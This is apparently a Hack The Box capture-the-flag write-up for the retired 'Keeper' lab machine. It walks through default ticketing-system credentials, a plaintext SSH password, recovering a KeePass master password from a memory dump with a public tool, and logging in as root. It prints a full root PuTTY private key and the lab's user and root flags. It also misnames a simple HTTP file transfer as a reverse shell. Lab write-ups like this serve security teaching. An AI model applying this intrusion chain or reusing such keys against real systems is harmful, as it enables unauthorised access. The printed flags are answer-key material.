# HTB Keeper Overview
Keeper is an easy-difficulty Linux machine that features a support ticketing system that uses default credentials. Enumerating the service, we are able to see clear text credentials that lead to SSH access. With `SSH` access, we can gain access to a KeePass database dump file, which we can leverage to retrieve the master password. With access to the `Keepass` database, we can access the root `SSH` keys, which are used to gain a privileged shell on the host.
![image]


_Note: Write-ups are only allowed for Retired machines._

Target Machine: `10.10.11.227`

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
## Enumeration
### Network Scan

 nmap -sC -sV --min-rate 5000 10.10.11.227
 
 sudo nmap -sC -sV --min-rate 1000 10.10.11.227 -oN nmap.out 
 ![image]

Port 22 open (SSH)
Port 80 open (HTTP)
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
### DNS 
 Add the <ip> and the <hostname> into our /etc/hosts file, so we can access the site using the domain name as well:
 
echo "10.10.11.227 keeper.htb tickets.keeper.htb" | sudo tee -a /etc/hosts   
 
keeper.htb	tickets.keeper.htb
 ![image]
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![image]
request tracker default credentials on google:

username: root
password: password
![image]

enumerate further > admin > users > list > find user + default password
![image]
![image]



let's ssh login

ssh user@ip 

ssh lnorgaard@keeper.htb

enter password: Welcome2023!
![image]

whoami
ls
cat user.txt
![image]


User flag captured:

650cbb7d7e90f981a8421d68cb7dcbc4

 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Additionally, let's see if we have any sudo permissions on any commands
 ![image]
 
 
 No additional sudo user permissions, so let's just take the RT30000.zip file back with us using a reverse shell:

While on Inorgard@keeper: 
python3 -m http.server 
![image]



From our host machine:
wget http://10.10.11.227:8000/RT30000.zip
![image]



target machine confirms it is sending as well with HTTP 200 signal
![image]

on host machine, confirm we have the file.

ls 
![image]


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Unzip file
![image]
unzip RT30000.zip



• KeePassDumpFull.dmp  file
• passcodes.kdbx    (keepass database file)

google “keepass dump exploit poc” > leads to github
	note: pw must be typed and not copy + pasted

https://github.com/vdohney/keepass-password-dumper

1. Install .NET (most major operating systems supported).
2. Clone the repository: git clone https://github.com/vdohney/keepass-password-dumper or download it from GitHub
3. Enter the project directory in your terminal (Powershell on Windows) cd keepass-password-dumper
4. dotnet run PATH_TO_DUMP



1. dotnet
![image]

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Troubleshooted dotnet not reading the file correctly
![image]

https://learn.microsoft.com/en-us/dotnet/core/install/linux-scripted-manual#scripted-install
https://github.com/dotnet/core/issues/7699

Do the following:
1. Remove all .NET packages
sudo apt remove --purge dotnet*
sudo apt remove --purge aspnetcore*
1. Delete PMC repository from APT, using any of the typical methods, for instance by deleting the repo .list file
sudo rm /etc/apt/sources.list.d/microsoft-prod.list
1. Update APT
sudo apt update
1. Install .NET SDK 6.0
sudo apt install dotnet-sdk-6.0

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
SOLVED
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


2. git clone https://github.com/vdohney/keepass-password-dumper 
![image]

3. cd keepass-password-dumper
![image]

4. dotnet run ../KeePassDumpFull.dmp

dotnet run ~/HTBboxes/CTF/Keeper/KeePassDumpFull.dmp
![image]


After googling “dgrød med fløde”, it's actually:

rødgrød med fløde

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

now that we have the password to the passcodes.kdbx file

kpcli
![image]


open passcodes.kdbx
password: rødgrød med fløde

no error messages, so let's try the ls command
![image]

Perfect!
cd passcodes
ls
(after more tries)

cd Network
![image]


show 0 -f
![image]


received putty key file for root
ssh-rsa


Tried:
ssh root@10.10.11.227
asks for password -> does not work because it needs authentication

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

REMOVED THE WHITE SPACES:

sudo nano putty > paste everything starting from “PuTTy-User..."
remove all the indents from beginning + save

What you should have is below:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

putty

Settings:
• session > host name is 10.10.11.227 (port 22 default)
• ssh > authentication > credentials: upload putty file

accept prompts, now lets see if we can access root
![image]



root
![image]

ls
cat root.txt
![image]

root flag captured:

518b434db7c3142f146ccc3e3011ef33

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


User flag captured:
650cbb7d7e90f981a8421d68cb7dcbc4


root flag captured:
518b434db7c3142f146ccc3e3011ef33

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
